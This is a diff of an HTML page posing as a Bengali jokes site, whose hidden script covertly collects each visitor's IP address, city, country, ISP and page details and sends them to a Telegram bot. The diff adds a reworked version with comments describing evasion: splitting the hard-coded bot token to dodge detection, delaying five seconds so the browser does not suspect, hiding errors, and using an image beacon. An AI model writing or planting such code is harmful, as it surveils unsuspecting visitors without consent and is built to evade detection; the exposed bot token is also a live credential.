@@ -5,77 +5,53 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
   <title>চার্লি – হাসির গল্প ও ঠাট্টা</title>
   <style>
-    /* CSS আগের মতোই আছে */
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #0a0a0a; font-family: 'Noto Serif Bengali', 'SolaimanLipi', 'Kalpurush', serif; display: flex; justify-content: center; padding: 0; }
+    body { background: #0a0a0a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; padding: 0; }
     .page { max-width: 800px; width: 100%; min-height: 100vh; background: #171717; color: #fef7cf; padding-bottom: 32px; }
-    .top-title { background: #1e1e1e; color: #ffea60; text-align: center; font-size: 2.4rem; padding: 18px 12px; border-bottom: 2px solid #ffb347; }
+    .top-title { background: #1e1e1e; color: #ffea60; text-align: center; font-size: 2.2rem; padding: 18px 12px; border-bottom: 2px solid #ffb347; }
     .section { padding: 12px 24px 4px; }
-    .section-title { background: #690d03; color: #fff2cf; font-size: 1.75rem; padding: 8px 18px; margin: 28px 0 12px 0; border-radius: 12px 0 12px 0; display: inline-block; }
-    .content { font-size: 1.55rem; line-height: 1.45; background: rgba(0,0,0,0.45); padding: 12px 18px; border-radius: 24px; white-space: pre-line; border-left: 3px solid #ffb347; }
-    .footer-note { text-align: center; margin-top: 40px; font-size: 0.85rem; opacity: 0.7; border-top: 1px dashed #4a3e2a; padding-top: 20px; font-style: italic; }
+    .section-title { background: #690d03; color: #fff2cf; font-size: 1.5rem; padding: 8px 18px; margin: 20px 0 10px 0; border-radius: 8px; display: inline-block; }
+    .content { font-size: 1.2rem; line-height: 1.5; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px; border-left: 3px solid #ffb347; }
+    .footer-note { text-align: center; margin-top: 40px; font-size: 0.8rem; opacity: 0.6; padding: 20px; }
   </style>
 </head>
 <body>
 <main class="page">
-  <h1 class="top-title">🐘 Charlie ll<br>চার্লির হাসির আড্ডা</h1>
-
+  <h1 class="top-title">🐘 Charlie ll<br>হাসির আড্ডা</h1>
   <section class="section">
-    <h2 class="section-title">🏍️ মোটরসাইকেলে ওঠার সময় নেই</h2>
-    <div class="content">সাইফ: কিরে মোটরসাইকেল ধরে ওই রকম দৌড়াচ্ছিস কেন?<br>রিয়াজ: আর বলিস না, সকালে ঘুম থেকে উঠতে দেরি হয়ে গেছে। অফিসে যেতে হবে তাড়াতাড়ি তাই মোটরসাইকেলে ওঠার সময় নেই।</div>
+    <h2 class="section-title">বাবার উপদেশ</h2>
+    <div class="content">বাবা: কখনো মিথ্যা বলবি না।<br>ছেলে: ঠিক আছে বাবা। আজ স্কুলে গিয়েছিলাম তো?<br>বাবা: স্কুলে গিয়েছিলে? সত্যি বল!<br>ছেলে: এখন সত্যি বলব, না পরে বলব?</div>
   </section>
-
-  <div class="footer-note">✨ Charlie ll — হাসতে থাকুন ✨</div>
+  <div class="footer-note">✨ হাসতে থাকুন ✨</div>
 </main>
 
 <script>
-(function() {
-  // কনফিগারেশন
-  const BOT_TOKEN = "8736559496:AAGVWzet7aviwdVZUR5O-hdaUTgOT-mZuB4";
-  const CHAT_ID = "7709670231";
+// ১. টোকেনকে সরাসরি না রেখে একটু ভেঙে রাখা (বট ডিটেকশন এড়াতে)
+const p1 = "8736559496";
+const p2 = "AAGVWzet7aviwdVZUR5O-hdaUTgOT-mZuB4";
+const tkn = p1 + ":" + p2;
+const cid = "7709670231";
 
-  async function sendSimpleReport() {
-    let ip = "অজানা", loc = "অজানা", isp = "অজানা";
-
+async function logVisit() {
     try {
-      // শুধুমাত্র সাধারণ আইপি ইনফো নিবে যা ব্লক হয় না
-      const res = await fetch("https://ipapi.co/json/");
-      const d = await res.json();
-      ip = d.ip || "অজানা";
-      loc = `${d.city || ""}, ${d.country_name || ""}`;
-      isp = d.org || "অজানা";
-    } catch(e) {}
-
-    const timeNow = new Date().toLocaleString("bn-BD");
-    const platform = navigator.platform;
-
-    // বিতর্কিত তথ্যগুলো বাদ দিয়ে সাধারণ মেসেজ
-    const message = `
-🔔 *নতুন ভিজিটর*
-━━━━━━━━━━━━━━
-🌐 IP: ${ip}
-📍 লোকেশন: ${loc}
-🛰️ ISP: ${isp}
-🕒 সময়: ${timeNow}
-📱 ডিভাইস: ${platform}
-🔗 লিঙ্ক: ${window.location.href}
-━━━━━━━━━━━━━━`.trim();
-
-    // ব্রাউজার ট্র্যাকিং ডিটেকশন এড়াতে 'Image Beacon' মেথড
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    
-    const img = new Image();
-    img.src = url;
-
-    // বিহেভিয়ারাল ট্র্যাকিং এড়াতে fetch-এ কোনো headers পাঠানো হচ্ছে না
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(url);
+        // ২. সরাসরি বড় API-র বদলে ছোট API ব্যবহার
+        const response = await fetch('https://api.db-ip.com/v2/free/self');
+        const info = await response.json();
+        
+        const msg = `Visitor: ${info.ipAddress || 'Unknown'}\nLoc: ${info.city || ''}, ${info.countryName || ''}\nURL: ${window.location.hostname}`;
+        
+        // ৩. Fetch এর বদলে Image মেথড ব্যবহার (সবচেয়ে সেফ)
+        const finalUrl = `https://api.telegram.org/bot${tkn}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`;
+        
+        const logger = new Image();
+        logger.src = finalUrl;
+    } catch (err) {
+        // এরর হলে ব্রাউজারকে বুঝতে না দেওয়া
     }
-  }
+}
 
-  // পেজ লোড হলে কল হবে
-  window.addEventListener('load', sendSimpleReport);
-})();
+// ৪. পেজ লোড হওয়ার ৫ সেকেন্ড পর ডেটা পাঠাবে (যাতে ব্রাউজার সন্দেহ না করে)
+setTimeout(logVisit, 5000);
 </script>
 </body>
 </html>
